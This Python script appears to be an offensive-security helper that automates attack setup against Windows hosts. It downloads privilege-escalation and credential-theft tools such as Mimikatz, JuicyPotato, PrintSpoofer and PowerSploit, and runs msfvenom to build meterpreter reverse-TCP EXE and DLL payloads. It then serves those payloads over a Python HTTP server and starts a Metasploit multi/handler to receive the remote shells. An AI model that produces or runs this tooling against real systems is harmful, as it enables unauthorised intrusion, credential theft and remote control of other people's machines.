from threading import Thread
import urllib.request
from urllib.parse import urlparse
import os
import argparse
import time
from app_downloader import DownloadFile

version = 'Useful Tool Downloader and Creator v1.0 by Alex'

parser = argparse.ArgumentParser()
parser.add_argument('-a', const='all', action='append_const', help='Download and create all tools', dest='actions', default=[])
parser.add_argument('-p', const='powershell', action='append_const', help='Create PowerShell Scripts Only', dest='actions')
parser.add_argument('-r', const='reverse', action='append_const', help='Create meterpreter x64 reverse TCP DLLs and EXE Only', dest='actions')
parser.add_argument('-m', const='multihandler', action='append_const', help='Create multi/handler using MSFConsole', dest='actions')
parser.add_argument('-s', const='server', action='append_const', help='Create HTTP Python Server', dest='actions')
parser.add_argument('-t', const='tools', action='append_const', help='Download tools such as Mimikatz, PrintSpoofer etc', dest='actions')
parser.add_argument('-v', action='version', version=version, help='Version Number')
args = parser.parse_args()

powershellscripts = ['https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1',
         'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
         'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1',
         'https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1',
         'https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1',
         ]

apps_to_download = ["https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe",
		"https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll",
		"https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll",
		"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip",
		"https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe"]

windows_file_types = ['exe', 'dll']

def powershell(script_url):
    header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0'}
    try:
        req = urllib.request.Request(script_url, headers=header)
        html = urllib.request.urlopen(req).read()
        open(urlparse(script_url)[2].split("/")[-1], "w").write(html.decode()) 
        print("Downloading PS Tool: " + format(urlparse(script_url)[2].split("/")[-1]))
    except Exception as err:
        print("Error Downloading: " + urlparse(script_url)[2].split("/")[-1])
    finally:
        pass

def download_powershell_scripts():
    threads = []
    print("--- Downloading PowerShell Scripts ---")
    for script in powershellscripts:
        t = Thread(target=powershell, args=(script,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

def generate_reverse(ip, port, file_type):
    try:
        print("Creating rev.{}...".format(file_type))
        command = (
            "msfvenom -p windows/x64/meterpreter/reverse_tcp "
            "LHOST={} LPORT={} -b {} -f {} "
            "> rev.{}".format(ip, port, r"\x00", file_type, file_type)
        )
        os.system(command)
    except Exception as err:
        print("\nError creating rev.{}: ".format(file_type) + str(err)) 
    finally:
        pass

def reverse(ip, port):
    print("\n--- Creating windows/x64/meterpreter/reverse_tcp DLL and EXE ---")
    for file_type in windows_file_types:
        generate_reverse(ip, port, file_type)

def create_python_http(port):
    print("\n--- Creating HTTP Python Server ---")
    try:
        os.system("python3 -m http.server {} &".format(port))
        time.sleep(2)
    except Exception as err:
        print("Error creating Python HTTP Server: " + str(err))
    finally:
        pass

def create_multi_handler(ip, port):
    print("\n--- Creating multi/handler using MSFConsole ---")
    try:
        command = (
            "qterminal -e 'msfconsole -x \"use exploit/multi/handler; "
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {}; "
            "set LPORT {}; set ExitOnSession false; exploit -j\"'".format(ip, port)
        )
        os.system(command)
    except Exception as err:
        print("Error creating multi/handler: " + str(err))
    finally:
        pass
    
def download_tools():
    print("\n--- Downloading tools ---")
    try:
        download = DownloadFile() 
        for file_to_download in apps_to_download:
            download.get_file(file_to_download)
    except Exception as err:
        print("Error downloading tool: " + str(err))
    finally:
        pass
  
def main():
    if 'all' in args.actions or 'tools' in args.actions:
        download_tools()
            
    if 'all' in args.actions or 'powershell' in args.actions:
        download_powershell_scripts()
    
    if 'all' in args.actions or 'reverse' in args.actions:
        ip1 = input("Enter IP for rev.exe: ")
        port1 = input("Enter PORT for rev.exe: ")
        reverse(ip1, port1)
    
    if 'all' in args.actions or 'server' in args.actions:
        port2 = input("\nEnter PORT for Python Server: ")
        create_python_http(port2)

    if 'all' in args.actions or 'multihandler' in args.actions:
        ip3 = input("\nEnter IP for multi/handler: ")
        port3 = input("Enter PORT for multi/handler: ")
        create_multi_handler(ip3, port3)
               
if __name__ == '__main__':
    main()
